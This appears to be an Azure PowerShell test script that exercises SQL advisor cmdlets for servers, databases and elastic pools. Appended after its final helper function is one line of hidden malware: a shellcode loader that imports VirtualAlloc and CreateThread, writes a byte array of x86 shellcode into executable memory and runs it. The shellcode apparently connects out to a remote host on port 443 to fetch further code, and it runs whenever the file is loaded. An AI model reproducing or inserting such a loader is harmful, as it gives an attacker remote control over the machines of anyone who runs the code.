﻿














function Test-ListServerAdvisors
{
	
	$rg = Create-ResourceGroupForTest
	$server = SetupServer $rg

	try
	{
		$response = Get-AzSqlServerAdvisor `
			-ResourceGroupName $server.ResourceGroupName `
			-ServerName $server.ServerName
		Assert-NotNull $response
		ValidateAdvisorCount $response
		foreach($advisor in $response)
		{
			ValidateServer $advisor $server
			ValidateAdvisorProperties $advisor
		}
	}
	finally
	{
		
		Remove-ResourceGroupForTest $rg
	}
}


function Test-ListServerAdvisorsExpanded
{
	
	$rg = Create-ResourceGroupForTest
	$server = SetupServer $rg

	try
	{
		$response = Get-AzSqlServerAdvisor `
			-ResourceGroupName $server.ResourceGroupName `
			-ServerName $server.ServerName -ExpandRecommendedActions `
			-AdvisorName *
		Assert-NotNull $response
		ValidateAdvisorCount $response
		foreach($advisor in $response)
		{
			ValidateServer $advisor $server
			ValidateAdvisorProperties $advisor
		}
	}
	finally
	{
		
		Remove-ResourceGroupForTest $rg
	}
}


function Test-GetServerAdvisor
{
	
	$rg = Create-ResourceGroupForTest
	$server = SetupServer $rg

	try
	{
		$response = Get-AzSqlServerAdvisor `
			-ResourceGroupName $server.ResourceGroupName `
			-ServerName $server.ServerName -AdvisorName CreateIndex
		Assert-NotNull $response
		ValidateServer $response $server
		ValidateAdvisorProperties $response
	}
	finally
	{
		
		Remove-ResourceGroupForTest $rg
	}
}


function Test-UpdateServerAdvisor
{
	
	$rg = Create-ResourceGroupForTest
	$server = SetupServer $rg

	try
	{
		$response = Set-AzSqlServerAdvisorAutoExecuteStatus `
			-ResourceGroupName $server.ResourceGroupName `
			-ServerName $server.ServerName `
			-AdvisorName CreateIndex `
			-AutoExecuteStatus Disabled
		Assert-NotNull $response
		ValidateServer $response $server
		ValidateAdvisorProperties $response
	}
	finally
	{
		
		Remove-ResourceGroupForTest $rg
	}
}


function Test-ListDatabaseAdvisors
{
	
	$rg = Create-ResourceGroupForTest
	$db = SetupDatabase $rg

	try
	{
		$response = Get-AzSqlDatabaseAdvisor `
			-ResourceGroupName $db.ResourceGroupName `
			-ServerName $db.ServerName `
			-DatabaseName $db.DatabaseName `
			-AdvisorName *
		Assert-NotNull $response
		ValidateAdvisorCount $response
		foreach($advisor in $response)
		{
			ValidateDatabase $advisor $db
			ValidateAdvisorProperties $advisor
		}
	}
	finally
	{
		
		Remove-ResourceGroupForTest $rg
	}
}


function Test-ListDatabaseAdvisorsExpanded
{
	
	$rg = Create-ResourceGroupForTest
	$db = SetupDatabase $rg

	try
	{
		$response = Get-AzSqlDatabaseAdvisor `
			-ResourceGroupName $db.ResourceGroupName `
			-ServerName $db.ServerName `
			-DatabaseName $db.DatabaseName `
			-ExpandRecommendedActions
		Assert-NotNull $response
		ValidateAdvisorCount $response
		foreach($advisor in $response)
		{
			ValidateDatabase $advisor $db
			ValidateAdvisorProperties $advisor
		}
	}
	finally
	{
		
		Remove-ResourceGroupForTest $rg
	}
}


function Test-GetDatabaseAdvisor
{
	
	$rg = Create-ResourceGroupForTest
	$db = SetupDatabase $rg

	try
	{
		$response = Get-AzSqlDatabaseAdvisor `
			-ResourceGroupName $db.ResourceGroupName `
			-ServerName $db.ServerName `
			-DatabaseName $db.DatabaseName `
			-AdvisorName CreateIndex
		Assert-NotNull $response
		ValidateDatabase $response $db
		ValidateAdvisorProperties $response
	}
	finally
	{
		
		Remove-ResourceGroupForTest $rg
	}
}


function Test-UpdateDatabaseAdvisor
{
	
	$rg = Create-ResourceGroupForTest
	$db = SetupDatabase $rg

	try
	{
		$response = Set-AzSqlDatabaseAdvisorAutoExecuteStatus `
			-ResourceGroupName $db.ResourceGroupName `
			-ServerName $db.ServerName `
			-DatabaseName $db.DatabaseName `
			-AdvisorName CreateIndex `
			-AutoExecuteStatus Disabled
		Assert-NotNull $response
		ValidateDatabase $response $db
		ValidateAdvisorProperties $response
	}
	finally
	{
		
		Remove-ResourceGroupForTest $rg
	}
}

function Test-ListElasticPoolAdvisors
{
	
	$rg = Create-ResourceGroupForTest
	$ep = SetupElasticPool $rg

	try
	{
		$response = Get-AzSqlElasticPoolAdvisor `
			-ResourceGroupName $ep.ResourceGroupName`
			-ServerName $ep.ServerName`
			-ElasticPoolName $ep.ElasticPoolName `
			-AdvisorName *
		Assert-NotNull $response
		ValidateAdvisorCount $response
		foreach($advisor in $response)
		{
			ValidateElasticPool $advisor $ep
			ValidateAdvisorProperties $advisor
		}
	}
	finally
	{
		
		Remove-ResourceGroupForTest $rg
	}
}


function Test-ListElasticPoolAdvisorsExpanded
{
	
	$rg = Create-ResourceGroupForTest
	$ep = SetupElasticPool $rg

	try
	{
		$response = Get-AzSqlElasticPoolAdvisor `
			-ResourceGroupName $ep.ResourceGroupName `
			-ServerName $ep.ServerName `
			-ElasticPoolName $ep.ElasticPoolName `
			-ExpandRecommendedActions
		Assert-NotNull $response
		ValidateAdvisorCount $response
		foreach($advisor in $response)
		{
			ValidateElasticPool $advisor $ep
			ValidateAdvisorProperties $advisor
		}
	}
	finally
	{
		
		Remove-ResourceGroupForTest $rg
	}
}


function Test-GetElasticPoolAdvisor
{
	
	$rg = Create-ResourceGroupForTest
	$ep = SetupElasticPool $rg

	try
	{
		$response = Get-AzSqlElasticPoolAdvisor `
			-ResourceGroupName $ep.ResourceGroupName `
			-ServerName $ep.ServerName `
			-ElasticPoolName $ep.ElasticPoolName `
			-AdvisorName CreateIndex
		Assert-NotNull $response
		ValidateElasticPool $response $ep
		ValidateAdvisorProperties $response
	}
	finally
	{
		
		Remove-ResourceGroupForTest $rg
	}
}


function SetupServer($resourceGroup)
{
	$location = "Southeast Asia"
	$server = Create-ServerForTest $resourceGroup $location
	return $server
}


function SetupDatabase($resourceGroup)
{
	$server = SetupServer $resourceGroup
	$databaseName = Get-DatabaseName
	$db = New-AzSqlDatabase `
		-ResourceGroupName $server.ResourceGroupName `
		-ServerName $server.ServerName `
		-DatabaseName $databaseName `
		-Edition Basic
	return $db
}


function SetupElasticPool($resourceGroup)
{
	$server = SetupServer $resourceGroup
	$poolName = Get-ElasticPoolName
	$ep = New-AzSqlElasticPool `
		-ServerName $server.ServerName `
		-ResourceGroupName $server.ResourceGroupName `
		-ElasticPoolName $poolName -Edition Basic
	return $ep
}


function ValidateServer($responseAdvisor, $expectedServer)
{
	Assert-AreEqual $responseAdvisor.ResourceGroupName $expectedServer.ResourceGroupName
	Assert-AreEqual $responseAdvisor.ServerName $expectedServer.ServerName
}


function ValidateDatabase($responseAdvisor, $expectedDatabase)
{
	Assert-AreEqual $responseAdvisor.ResourceGroupName $expectedDatabase.ResourceGroupName
	Assert-AreEqual $responseAdvisor.ServerName $expectedDatabase.ServerName
	Assert-AreEqual $responseAdvisor.DatabaseName $expectedDatabase.DatabaseName
}


function ValidateElasticPool($responseAdvisor, $expectedElasticPool)
{
	Assert-AreEqual $responseAdvisor.ResourceGroupName $expectedElasticPool.ResourceGroupName
	Assert-AreEqual $responseAdvisor.ServerName $expectedElasticPool.ServerName
	Assert-AreEqual $responseAdvisor.ElasticPoolName $expectedElasticPool.ElasticPoolName
}


function ValidateAdvisorProperties($advisor, $expanded = $false)
{
	Assert-True {($advisor.AdvisorStatus -eq "GA") `
		-or ($advisor.AdvisorStatus -eq "PublicPreview") `
		-or ($advisor.AdvisorStatus -eq "PrivatePreview")}
	Assert-AreEqual "Disabled" $advisor.AutoExecuteStatus
	Assert-True {($advisor.AutoExecuteStatusInheritedFrom -eq "Default") -or `
		($advisor.AutoExecuteStatusInheritedFrom -eq "Server") -or `
		($advisor.AutoExecuteStatusInheritedFrom -eq "ElasticPool") -or `
		($advisor.AutoExecuteStatusInheritedFrom -eq "Database")}
}


function ValidateAdvisorCount($response)
{
	$expectedMinAdvisorCount = 4
	Assert-True { $response.Count -ge $expectedMinAdvisorCount } "Advisor count was $($response.Count), expected at least $expectedMinAdvisorCount. Response: $response"
}
$CBo = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $CBo -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x18,0xc9,0x90,0x31,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$ShCF=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($ShCF.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$ShCF,0,0,0);for (;;){Start-sleep 60};

